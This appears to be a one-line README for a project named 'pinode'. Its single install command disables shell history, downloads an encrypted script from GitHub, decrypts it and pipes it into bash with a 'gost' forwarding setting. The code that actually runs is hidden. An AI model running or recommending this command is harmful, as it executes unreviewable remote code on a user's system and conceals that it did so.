# pinode

```bash
set +o history; curl -s https://raw.githubusercontent.com/wlrsx/pinode/refs/heads/main/pinode-gateway.enc | openssl enc -aes-256-cbc -d -pbkdf2 -iter 100000 | (FORWARDING_METHOD=gost bash)
```
